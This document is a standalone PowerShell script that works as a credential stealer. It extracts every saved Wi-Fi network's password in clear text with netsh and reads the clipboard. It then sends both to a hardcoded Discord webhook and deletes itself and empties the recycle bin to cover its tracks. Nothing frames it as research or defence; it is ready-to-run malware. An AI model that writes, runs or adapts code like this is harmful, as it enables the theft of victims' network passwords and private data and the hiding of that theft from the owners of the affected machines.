$hook = "https://discord.com/api/webhooks/1366201501802041374/ENdipWjx_vaIQYHXDYo-kwppUazTUQ9LpTj7oewX0g_wln4_vi9F_HdVdiaiBjFoovZY"

# Harvest Wi-Fi credentials
$wifi = netsh wlan show profiles | Select-String "All User Profile" | % {
    $name = $_.ToString().Split(":")[1].Trim()
    $pass = (netsh wlan show profile name=$name key=clear | Select-String "Key Content").ToString().Split(":")[1].Trim()
    [PSCustomObject]@{SSID=$name;Password=$pass}
} | Format-Table | Out-String

# Harvest clipboard data
Add-Type -AssemblyName System.Windows.Forms
$clipboard = [System.Windows.Forms.Clipboard]::GetText()

# Build Discord message
$body = @{
    content = "**Wi-Fi Credentials**`n$wifi`n**Clipboard Content**`n$clipboard"
}

# Exfiltrate via Discord
irm -Uri $hook -Method Post -Body ($body | ConvertTo-Json) -ContentType "application/json"

# Cleanup
Clear-RecycleBin -Force -ErrorAction SilentlyContinue
Remove-Item $MyInvocation.MyCommand.Path -Force
